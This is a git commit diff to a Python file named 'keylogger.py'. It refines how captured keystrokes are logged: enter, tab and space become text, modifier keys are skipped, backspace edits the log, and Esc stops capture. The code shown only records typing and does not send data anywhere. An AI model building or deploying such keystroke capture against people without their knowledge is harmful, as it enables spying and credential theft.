febd822efd6a6f38576460439882925e81c136dc
ItsJESH <jenishpaghadalin018@gmail.com>
2025-03-03 19:09:13 +0530

    Do some upgrades in Keylog

--- keylogger.py
+++ keylogger.py
@@ -6,7 +6,24 @@ log=""
 def onpress(k):
     global log
     try:
-        log+=str(k).strip("'")
+        if k== keyboard.Key.enter:
+            log += "\n"
+        elif k== keyboard.Key.tab:
+            log += "\t"
+        elif k== keyboard.Key.space:
+            log += " "
+        elif k== keyboard.Key.shift:
+            pass
+        elif k== keyboard.Key.backspace and len(log) == 0:
+            pass
+        elif k== keyboard.Key.backspace and len(log) > 0:
+            log = log[:-1]
+        elif k== keyboard.Key.ctrl_l or k== keyboard.Key.ctrl_r:
+            pass
+        elif k== keyboard.Key.esc:
+            return False
+        else:
+           log += str(k).strip("'")
     except KeyError:
         print(KeyError)
     finally:
